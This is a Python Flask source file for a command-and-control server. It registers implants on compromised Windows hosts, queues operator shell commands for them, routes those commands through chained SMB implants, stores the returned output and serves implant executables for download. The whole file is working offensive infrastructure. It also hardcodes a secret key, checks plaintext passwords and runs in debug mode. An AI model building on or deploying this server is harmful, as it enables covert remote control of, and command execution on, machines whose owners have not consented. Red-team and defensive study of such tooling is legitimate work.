import flask
from flask import Flask, Response, request, render_template, redirect, send_from_directory, url_for, jsonify
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import flask_login
import base64

from sqlalchemy import ForeignKey

app = Flask(__name__)
app.secret_key = '6AC6663F6BCFEB4191481AC41972DBEE4BDF6E7AA43E74F7E64C5F07DE69CE02'

##############
#  Database  #
##############
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# Schema definitions
class Implant(db.Model):
	ComputerName = db.Column(db.String, primary_key=True)
	ProductID = db.Column(db.String, nullable=True)
	OSName = db.Column(db.String, nullable=True)
	OSBuild = db.Column(db.String, nullable=True)
	Username = db.Column(db.String, nullable=True)
	last_checkin = db.Column(db.DateTime, nullable=False, default=datetime.utcnow)
	creation_date = db.Column(db.DateTime, nullable=False, default=datetime.utcnow)

class Adjacency(db.Model):
	id = db.Column(db.Integer, primary_key=True)
	ParentHostname = db.Column(db.String, ForeignKey(Implant.ComputerName), nullable=False)
	ChildHostname = db.Column(db.String, ForeignKey(Implant.ComputerName), nullable=False)

class Operator(flask_login.UserMixin, db.Model):
	id = db.Column(db.Integer, primary_key=True)
	username = db.Column(db.String, nullable=False, unique=True)
	password = db.Column(db.String, nullable=False)

class Task(db.Model):
	id = db.Column(db.Integer, primary_key=True)
	cmd = db.Column(db.String, nullable=False)
	status = db.Column(db.String, nullable=False, default="Pending")
	implant_id = db.Column(db.String, nullable=False)
	output = db.Column(db.String, nullable=True)

###################
#  Login Manager  #
###################
login_manager = flask_login.LoginManager()
login_manager.init_app(app)

@login_manager.unauthorized_handler
def unauthorized_handler():
	return render_template('unauth.html')

@login_manager.user_loader
def load_user(oid):
    return Operator.query.get(oid)

##############
#	Routes	 #
##############

# Login route
@app.route('/', methods=['GET', 'POST'])
def login():
	# GET request
	if flask.request.method == 'GET':
		return render_template('login.html')
	# POST request
	username = flask.request.form['username']
	password = flask.request.form['password']
	operator = Operator.query.filter_by(username=username, password=password).first()
	if operator != None:
		# Valid login
		flask_login.login_user(operator, remember=True)
		return redirect('/monitor')
	# Invalid login
	return render_template('unauth.html')

@app.route('/createtask/<Hostname>', methods=['POST'])
@flask_login.login_required
def createtask(Hostname):
	new_task = Task(cmd=flask.request.form['command'], implant_id=Hostname)
	db.session.add(new_task)
	db.session.commit()
	return redirect('/monitor')

@app.route('/tasks', methods=['GET'])
def get_tasks():
	# Retrieve task	
	task = Task.query.filter_by(status="Pending").first()
	if(task is not None):
		# Generate path to host
		hostname = task.implant_id
		path = [hostname]
		parentRelationship = Adjacency.query.filter_by(ChildHostname=hostname).first()
		while(parentRelationship is not None):
			hostname = parentRelationship.ParentHostname
			path.insert(0, hostname)
			parentRelationship = Adjacency.query.filter_by(ChildHostname=hostname).first()
		pathString = ','.join(path)

		# Send pending commands to implant, update task status
		task.status = "Issued"
		db.session.commit()
		return jsonify({ "Path": pathString, "Command": task.cmd })
	else:
		return jsonify({ "Path": "", "Command": "" })

@app.route('/taskupload', methods=['POST'])
def task_response():
	data = request.json
	linkedTask = Task.query.filter_by(implant_id=data['Hostname'], cmd=data['Command'], status="Issued").first()
	linkedTask.output = data['Output']
	linkedTask.status = "Complete"
	db.session.commit()
	return jsonify({ "status": "success" })

@app.route('/monitor')
@flask_login.login_required
def monitor():
	implantlist = Implant.query.all()
	templatelist = []
	for implant in implantlist:
		pending = Task.query.filter_by(implant_id=implant.ComputerName, status="Pending").count()
		templatelist.append((implant.ComputerName, pending, implant.last_checkin, implant.creation_date))
	return render_template('monitor.html', implants=templatelist)

@app.route('/register', methods=['POST'])
def register():
	# TODO: Needs error checking
	# Get implant id (iid)
	pid = request.json['ProductID']
	osname = request.json['OSName']
	osbuild = request.json['OSBuild']
	username = request.json['Username']
	computer_name = request.json['ComputerName']
	# Save to database
	# Check if exists
	if (Implant.query.filter_by(ProductID=pid).first() is None):
		new_implant = Implant(ProductID=pid, OSName=osname, OSBuild=osbuild, Username=username, ComputerName=computer_name)
		db.session.add(new_implant)
		db.session.commit()
		return flask.Response(response='Registered', status=200)
	else:
		return flask.Response(response='Previously registered', status=200)

@app.route('/smbregister', methods=['POST'])
def smbregister():
	host = flask.request.form['hostname']
	parent = flask.request.form['parent']
	smbimplant = Implant(ComputerName=host)
	relation = Adjacency(ParentHostname=parent, ChildHostname=host)
	db.session.add(smbimplant)
	db.session.add(relation)
	db.session.commit()
	return redirect('/monitor')

	

@app.route('/httpnode', methods=['GET'])
def download_httpnode():
	return send_from_directory(directory=app.root_path, filename='httpnode.exe')

@app.route('/smbnode', methods=['GET'])
def download_smbnode():
	return send_from_directory(directory=app.root_path, filename='smbnode.exe')

if __name__ == "__main__":
	app.run(port=5000, debug=True)
